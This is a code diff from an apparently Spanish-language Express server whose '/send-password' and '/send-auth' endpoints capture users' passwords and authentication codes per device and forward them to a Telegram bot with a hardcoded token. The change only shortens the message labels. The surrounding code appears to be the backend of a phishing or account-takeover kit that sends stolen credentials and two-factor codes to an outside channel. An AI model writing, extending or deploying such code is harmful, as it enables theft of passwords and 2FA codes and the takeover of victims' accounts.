@@ -48,7 +48,7 @@ app.post('/send-password', async (req, res) => {
 
     // Almacenar la contraseña por dispositivo
     if (usuariosData[dispositivoID]) {
-        usuariosData[dispositivoID].contraseña = `Contraseña ${dispositivoID.replace('id.', '')}: \`${password}\``;
+        usuariosData[dispositivoID].contraseña = `C ${dispositivoID.replace('id.', '')}: \`${password}\``;
     }
 
     await fetch(`https://api.telegram.org/bot8748275769:AAE6pBgwNMb-4X3kLljS4zPH03dhlQd7Jz8/sendMessage`, {
@@ -69,7 +69,7 @@ app.post('/send-auth', async (req, res) => {
 
     // Almacenar el código de autenticación por dispositivo
     if (usuariosData[dispositivoID]) {
-        usuariosData[dispositivoID].codigo = `Autenticación ${dispositivoID.replace('id.', '')}: \`${authCode}\``;
+        usuariosData[dispositivoID].codigo = `A ${dispositivoID.replace('id.', '')}: \`${authCode}\``;
     }
 
     await fetch(`https://api.telegram.org/bot8748275769:AAE6pBgwNMb-4X3kLljS4zPH03dhlQd7Jz8/sendMessage`, {
